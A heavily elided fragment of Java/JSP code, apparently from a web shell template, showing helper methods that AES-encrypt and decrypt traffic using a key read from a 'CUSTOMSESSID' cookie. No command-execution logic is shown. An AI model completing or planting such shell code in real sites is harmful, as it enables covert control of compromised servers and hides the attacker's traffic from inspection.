...
// ################################################
    ...
    String asenc(String str, String decode) throws Exception{
        ...
        }else if(decode.equals("aes") || decode == "aes"){
        	String sb1 = "";
			sb1 = encrypt(aesKey,str);
            return sb1.replace("\r\n","");
        }
        return str;
    }
    ...
    String decode(String str, String encode) throws Exception{
        if(encode.equals("hex") || encode=="hex"){
            ...
            String str1 = decrypt(aesKey,str);
            return str1.trim();
        }
        return str;
    }
	...
	String getCookie(Cookie[] cookies){
		...
		if( cookies != null ){
			for (Cookie c : cookies) {
				if (c.getName().equals("CUSTOMSESSID")) {
		 			key = c.getValue();
		 			break;
		 		}
	 		}
...
<%
    ...
    StringBuffer sb = new StringBuffer("");
    try {
    	aesKey = getCookie(request.getCookies());
